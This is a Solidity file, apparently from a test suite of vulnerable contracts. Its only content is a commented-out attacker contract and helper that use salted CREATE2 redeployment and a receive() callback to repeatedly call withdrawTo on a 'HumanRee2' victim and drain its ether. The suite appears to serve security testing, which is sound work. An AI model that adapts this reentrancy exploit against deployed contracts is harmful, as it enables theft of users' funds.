// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "../../cross-contract/access-control/human/Human_ree1.sol";
// TODO FIXME: adapt this to new logic
// contract HumanRee2Attacker {
//     bool public deposited;
//     bool public attacked;
//     bytes initCode;
//     uint public salt = 8746532;
//     address public victim;
//     address[] public deployedAux;

//     function attack(address humanRee) public payable {
//         // new Attacker2 with salt here
//         victim = humanRee;
//         new HumanRee2AttackerAux{salt: bytes32(salt), value: msg.value}(
//             deposited,
//             victim,
//             payable(address(this))
//         );
//     }

//     function setDeposited(bool _deposited) public {
//         deposited = _deposited;
//     }

//     function collectEther() public {
//         payable(msg.sender).transfer(address(this).balance);
//     }

//     receive() external payable {
//         if (victim.balance >= 1 ether) {
//             attacked = true;
//             new HumanRee2AttackerAux{salt: bytes32(salt)}(
//                 deposited,
//                 victim,
//                 payable(address(this))
//             );
//         }
//     }

//     function getAuxBalances() public view returns (uint256[] memory) {
//         uint256[] memory balances = new uint256[](deployedAux.length);
//         for (uint i = 0; i < deployedAux.length; i++) {
//             balances[i] = payable(deployedAux[i]).balance;
//         }
//         return balances;
//     }
// }

// contract HumanRee2AttackerAux {
//     HumanRee2 humanRee;
//     HumanRee2Attacker attacker;

//     constructor(
//         bool deposited,
//         address _humanRee,
//         address payable _attacker
//     ) payable {
//         humanRee = HumanRee2(_humanRee);
//         attacker = HumanRee2Attacker(_attacker);
//         if (deposited) {
//             humanRee.withdrawTo(_attacker);
//         } else {
//             humanRee.bid{value: msg.value}();
//             attacker.setDeposited(true);
//             humanRee.withdrawTo(_attacker);
//         }
//     }
// }
